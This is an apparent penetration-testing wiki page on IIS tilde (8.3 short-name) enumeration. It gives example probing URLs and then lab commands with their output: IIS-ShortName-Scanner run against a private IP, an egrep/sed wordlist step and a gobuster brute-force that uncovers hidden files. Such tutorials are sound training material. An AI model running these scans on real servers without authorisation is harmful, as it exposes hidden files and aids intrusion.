---
icon: windows
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# ISS Exploitation

## IIS Tilde

IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the `8.3 format`) on some versions of Microsoft Internet Information Services (IIS) web servers. This method takes advantage of a specific vulnerability in IIS, resulting from how it manages short file names within its directories.

When a file or folder is created on an IIS server, Windows generates a short file name in the `8.3 format`, consisting of eight characters for the file name, a period, and three characters for the extension. Intriguingly, these short file names can grant access to their corresponding files and folders, even if they were meant to be hidden or inaccessible.

The tilde (`~`) character, followed by a sequence number, signifies a short file name in a URL. Hence, if someone determines a file or folder's short file name, they can exploit the tilde character and the short file name in the URL to access sensitive data or hidden resources.

### Enumeration & Exploitation

IIS tilde directory enumeration primarily involves sending HTTP requests to the server with distinct character combinations in the URL to identify valid short file names. Once a valid short file name is detected, this information can be utilised to access the relevant resource or further enumerate the directory structure.

The enumeration process starts by sending requests with various characters following the tilde:

{% code title="Example URLs" %}
```http
http://acme.com/~a
http://acme.com/~b
http://acme.com/~c
...
```
{% endcode %}

Assume the server contains a hidden directory named `SecretDocuments`. When a request is sent to `http://acme.com/~s`, the server replies with a `200 OK` status code, revealing a directory with a short name beginning with "s".

The enumeration process continues by appending more characters:

{% code title="Example URLs" %}
```http
http://acme.com/~se
http://acme.com/~sf
http://acme.com/~sg
...
```
{% endcode %}

The server delivers a `200 OK` status code for the request `http://acme.com/~sec`, further narrowing the short name to "sec".

Continuing this procedure, the short name `secret~1` is eventually discovered when the server returns a `200 OK` status code for the request `http://acme.com/~secret`.

Once the short name `secret~1` is identified, enumeration of specific file names within that path can be performed, potentially exposing sensitive documents.

For instance, if the short name `secret~1` is determined for the concealed directory `SecretDocuments`, files in that directory can be accessed by submitting requests such as:

{% code title="Example URLs" %}
```http
http://acme.com/secret~1/somefile.txt
http://acme.com/secret~1/anotherfile.docx
```
{% endcode %}

The same IIS tilde directory enumeration technique can also detect 8.3 short file names for files within the directory. After obtaining the short names, those files can be directly accessed using the short names in the requests.

{% code title="Example URL" %}
```http
http://acme.com/secret~1/somefi~1.txt
```
{% endcode %}

In 8.3 short file names, such as `somefi~1.txt`, the number "1" is a unique identifier that distinguishes files with similar names within the same directory. The numbers following the tilde (`~`) assist the file system in differentiating between files that share similarities in their names, ensuring each file has a distinct 8.3 short file name.

For example, if two files named `somefile.txt` and `somefile1.txt` exist in the same directory, their 8.3 short file names would be:

* `somefi~1.txt` for `somefile.txt`
* `somefi~2.txt` for `somefile1.txt`

### **Enumeration using IIS ShortName Scanner**

Manually sending HTTP requests for each letter of the alphabet can be a tedious process. Fortunately, there is a tool called `IIS-ShortName-Scanner` that can automate this task.

{% hint style="info" %}
## ISS-ShortName-Scanner GitHub

[https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

To use IIS-ShortName-Scanner, you will need to install **Oracle Java** on your device. Details can be found in the following link:

[https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/](https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/)
{% endhint %}

When you run the below command, it will prompt you for a proxy, just hit enter for No.

{% code title="Command" %}
```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```
{% endcode %}

```shell-session
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

Upon executing the tool, it discovers 2 directories and 3 files. However, the target does not permit `GET` access to `http://10.129.204.231/TRANSF~1.ASP`, necessitating the brute-forcing of the remaining filename.

### Enumeration with Custom Wordlists

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

This command combines `egrep` and `sed` to filter and modify the contents of input files, then save the results to a new file.

<table><thead><tr><th width="171">Command Part</th><th>Description</th></tr></thead><tbody><tr><td><code>egrep -r ^transf</code></td><td>The <code>egrep</code> command is used to search for lines containing a specific pattern in the input files. The <code>-r</code> flag indicates a recursive search through directories. The <code>^transf</code> pattern matches any line that starts with "transf". The output of this command will be lines that begin with "transf" along with their source file names.</td></tr><tr><td><code>|</code></td><td>The pipe symbol (<code>|</code>) is used to pass the output of the first command (<code>egrep</code>) to the second command (<code>sed</code>). In this case, the lines starting with "transf" and their file names will be the input for the <code>sed</code> command.</td></tr><tr><td><code>sed 's/^[^:]*://'</code></td><td>The <code>sed</code> command is used to perform a find-and-replace operation on its input (in this case, the output of <code>egrep</code>). The <code>'s/^[^:]*://'</code> expression tells <code>sed</code> to find any sequence of characters at the beginning of a line (<code>^</code>) up to the first colon (<code>:</code>), and replace them with nothing (effectively removing the matched text). The result will be the lines starting with "transf" but without the file names and colons.</td></tr><tr><td><code>> /tmp/list.txt</code></td><td>The greater-than symbol (<code>></code>) is used to redirect the output of the entire command (i.e., the modified lines) to a new file named <code>/tmp/list.txt</code>.</td></tr></tbody></table>

Once you have created the custom wordlist, you can use [gobuster.md](../../../toolbox/tooling/information-gathering/gobuster.md "mention") to enumerate all items in the target.

{% code title="Command" %}
```bash
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```
{% endcode %}

{% code title="Output" %}
```shell-session
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/23 15:14:05 Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200) [Size: 941]
Progress: 306 / 309 (99.03%)
===============================================================
2023/03/23 15:14:11 Finished
===============================================================
```
{% endcode %}

From the output, you can see that [gobuster.md](../../../toolbox/tooling/information-gathering/gobuster.md "mention") has successfully identified the `transfer.aspx` file as the full filename corresponding to the previously discovered short name `TRANSF~1.ASP`.
